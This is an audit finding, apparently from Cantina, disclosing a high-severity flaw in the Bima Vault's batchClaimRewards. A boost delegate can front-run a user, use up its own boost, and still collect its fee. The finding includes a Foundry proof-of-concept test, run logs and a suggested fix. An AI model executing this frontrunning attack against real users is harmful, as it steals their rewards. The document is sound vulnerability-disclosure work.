# Boost Delegate Can Steal Reward from User Due to Insufficient Slippage Protection

**Severity:** high
**Auditor:** Cantina
**Protocol:** Bima 
**Keywords:** BoostDelegate, Bima, reward, slippage protection, frontrunning, fee, malicious user, honest users, attack scenario, smart contract, Ethereum, delegation, claim rewards, maxFeePct, user transaction, fee percentage, abuse, vulnerability, loss, proof of concept

---

# Boost Delegate Can Steal Reward from User Due to Insufficient Slippage Protection
Submitted by T1MOH  
Severity: High Risk  
Context: (No context files were provided by the reviewer)  

Description: There is a function \u0060Vault.batchClaimRewards()\u0060. It allows to claim Bima rewards using boost of \u0060boostDelegate\u0060. I.e., \u0060boostDelegate\u0060 "sells" his boost for a fee percent of the claimed amount. It\u0027s pretty simple:
1. User claims Bima from different rewards tokens.
2. Instead of consuming his own boost, he uses \u0060boostDelegate\u0060.
3. User receives boosted amount and pays some fee to \u0060boostDelegate\u0060.

There is a protection to prevent \u0060boostDelegate\u0060 from frontrunning and setting high fee; the user can set \u0060maxFee\u0060 he accepts:

\u0060\u0060\u0060solidity
function batchClaimRewards(
    address receiver,
    address boostDelegate,
    IRewards[] calldata rewardContracts,
    uint256 maxFeePct // <<<
) external returns (bool success) {...}

function _transferAllocated(
    uint256 maxFeePct,
    address account,
    address receiver,
    address boostDelegate,
    uint256 amount
) internal {
    // ...
    if (boostDelegate != address(0)) {
        // cache delegation data from storage
        Delegation memory data = boostDelegation[boostDelegate];
\u0060\u0060\u0060
## Vulnerabilities

\u0060\u0060\u0060solidity
// revert if delegation is not enabled
require(data.isEnabled, "Invalid delegate");
// copy callback address to working data
delegateCallback = data.callback;
// if fee in delegation data is max(uint16) then execute callback
// to get actual fee percent
if (data.feePct == type(uint16).max) {
    fee = delegateCallback.getFeePct(account, receiver, amount, previousAmount, totalWeekly);
    // enforce callback fee can\u0027t be greater than constant max fee
    require(fee <= BIMA_100_PCT, "Invalid delegate fee");
}
// otherwise use fee percent in delegation data
else fee = data.feePct;
// enforce fee percent can\u0027t be greater than input max fee
require(fee <= maxFeePct, "fee exceeds maxFeePct"); // <<<
\u0060\u0060\u0060

However boostDelegate can abuse current design and steal reward from honest users, here is attack scenario:

1. BoostDelegate has big weight and therefore big boostedAmount each week.
2. BoostDelegate wants to claim his rewards, hence consume boost.
3. However BoostDelegate configure his delegate params, let\u0027s say 10% fee.
4. User wants to claim big amount, however his own boost is too low. Therefore he uses BoostDelegate.
5. BoostDelegate frontruns User, and claims boost on his own.
6. User\u0027s transaction is executed. Delegate fee is 10% as previously, therefore check is successful. However all boost was consumed previously, therefore user receives only half of the expected amount. Moreover user pays 10% fee to BoostDelegate.

That is how a malicious user can honeypot innocent users and steal Bima from them. This attack doesn\u0027t require any preconditions. Basically any malicious user can employ such attack before claiming reward.

As a result user loses:

1. Potential reward from his own boost - instead it uses boostDelegate without boost. Loss is up to 50% of claimed amount.
2. Fee paid to boostDelegate for nothing.

Proof of Concept: Initially make this change:

\u0060\u0060\u0060diff
192 ~/projects/audit/PoC/bima-v1-core% git diff
diff --git a/test/foundry/dao/VaultTest.t.sol b/test/foundry/dao/VaultTest.t.sol
index 06a03b2..7bb3e48 100644
--- a/test/foundry/dao/VaultTest.t.sol
+++ b/test/foundry/dao/VaultTest.t.sol
@@ -10,6 +10,8 @@ import {BIMA_100_PCT} from "../../../contracts/dependencies/Constants.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import {console} from "forge-std/console.sol";
+
contract VaultTest is TestSetup {
    uint256 internal constant MAX_COUNT = 10;
\u0060\u0060\u0060

Insert this test into test/foundry/dao/VaultTest.t.sol:

\u0060\u0060\u0060solidity
function test_custom13_T1MOH() public {
    skip(20 weeks);
    // 1. Lock Bima
    address boostDelegate = makeAddr("boostDelegate");
    uint128[] memory _fixedInitialAmounts;
\u0060\u0060\u0060
## Initial Allowances Setup
\u0060\u0060\u0060solidity
IBimaVault.InitialAllowance[] memory initialAllowances = new IBimaVault.InitialAllowance[](2);
initialAllowances[0].receiver = users.user1;
initialAllowances[0].amount = 100e18;
initialAllowances[1].receiver = boostDelegate;
initialAllowances[1].amount = 100e18;
vm.startPrank(users.owner);
bimaVault.setInitialParameters(
    emissionSchedule,
    boostCalc,
    INIT_BAB_TKN_TOTAL_SUPPLY,
    INIT_VLT_LOCK_WEEKS,
    _fixedInitialAmounts,
    initialAllowances
);
vm.stopPrank();
\u0060\u0060\u0060
## User 1 Transfer
\u0060\u0060\u0060solidity
vm.startPrank(users.user1);
bimaToken.transferFrom(address(bimaVault), users.user1, 100e18);
tokenLocker.lock(users.user1, 100, 52);
vm.stopPrank();
\u0060\u0060\u0060
## Boost Delegate Transfer
\u0060\u0060\u0060solidity
vm.startPrank(boostDelegate);
bimaToken.transferFrom(address(bimaVault), boostDelegate, 100e18);
tokenLocker.lock(boostDelegate, 100, 52);
vm.stopPrank();
\u0060\u0060\u0060
## Register Receiver
\u0060\u0060\u0060solidity
uint256 RECEIVER_ID = incentiveVoting.receiverCount();
vm.prank(users.owner);
bimaVault.registerReceiver(mockEmissionReceiverAddr, 1);
mockEmissionReceiver.setReward(5.36870886875e26 * 2); // this amount is maxBoosted of boostDelegate
\u0060\u0060\u0060
## Voting Process
\u0060\u0060\u0060solidity
IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
votes[0].id = RECEIVER_ID;
votes[0].points = incentiveVoting.MAX_POINTS();
vm.prank(users.user1);
incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);
vm.prank(boostDelegate);
incentiveVoting.registerAccountWeightAndVote(boostDelegate, 52, votes);
\u0060\u0060\u0060
## Configure Boost Delegate
\u0060\u0060\u0060solidity
uint16 maxFeePct = 1_000; // 10%
vm.prank(boostDelegate);
bimaVault.setBoostDelegationParams(true, maxFeePct, address(0));
skip(1 weeks);
vm.prank(mockEmissionReceiverAddr);
bimaVault.allocateNewEmissions(RECEIVER_ID);
\u0060\u0060\u0060
## Claimable Reward Calculation
\u0060\u0060\u0060solidity
(uint256 adjustedAmount, uint256 feeToDelegate) = bimaVault.claimableRewardAfterBoost(
    users.user1,
    users.user1,
    boostDelegate,
    mockEmissionReceiver
);
console.log("User expects to receive:");
console.log("adjustedAmount %e", adjustedAmount);
console.log("feeToDelegate %e", feeToDelegate);
\u0060\u0060\u0060
## Boost Delegate Frontrun
\u0060\u0060\u0060solidity
IRewards[] memory rewardContracts = new IRewards[](1);
rewardContracts[0] = mockEmissionReceiver;
vm.prank(boostDelegate);
bimaVault.batchClaimRewards(
    boostDelegate,
    address(0),
    rewardContracts,
    0
);
console.log("------------");
(uint256 maxBoosted, uint256 boosted) = bimaVault.getClaimableWithBoost(boostDelegate);
\u0060\u0060\u0060
## Code Execution Logs
\u0060\u0060\u0060javascript
console.log("BoostDelegate frontran and consumed boost:");
console.log("maxBoosted %e", maxBoosted);
console.log("boosted %e", boosted);
console.log("------------");
// 8. User\u0027s tx is executed
(adjustedAmount, feeToDelegate) = bimaVault.claimableRewardAfterBoost(
        users.user1,
        users.user1,
        boostDelegate,
        mockEmissionReceiver
);
console.log("User actually receives:");
console.log("adjustedAmount %e", adjustedAmount);
console.log("feeToDelegate %e", feeToDelegate);
\u0060\u0060\u0060

## Scenario in Proof of Concept
1. User and BoostDelegate lock Bima.
2. New receiver is registered.
3. They vote for receiver.
4. Configure boostDelegate params.
5. Allocate new emissions.
6. User sends transaction and expects to receive logged amounts.
7. BoostDelegate frontruns and claims his own reward consuming boost.
8. User\u0027s transaction from step 6 is executed. He doesn\u0027t receive any boost and pays fee.

As a result, BoostDelegate earned fee for nothing, i.e., stole Bima from User.

## Logs
Ran 1 test for test/foundry/dao/VaultTest.t.sol:VaultTest
[PASS] test_custom13_T1MOH() (gas: 1330249)

### User expects to receive:
- adjustedAmount 9.3952405203125e26
- feeToDelegate 9.3952405203125e25
------------
### BoostDelegate frontran and consumed boost:
- maxBoosted 0e0
- boosted 0e0
------------
### User actually receives:
- adjustedAmount 5.36870886875e26
- feeToDelegate 5.36870886875e25

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.65ms (727.83µs CPU time)

Refactor current slippage protection. Instead of maxFeePct you can use something like received amount percent which is receivedAmountAfterFee * 1e18 / claimedAmount. This ratio is 1e18 on maxBoost and decreases to 0.5 as boost is claimed, and it also includes delegate fee.
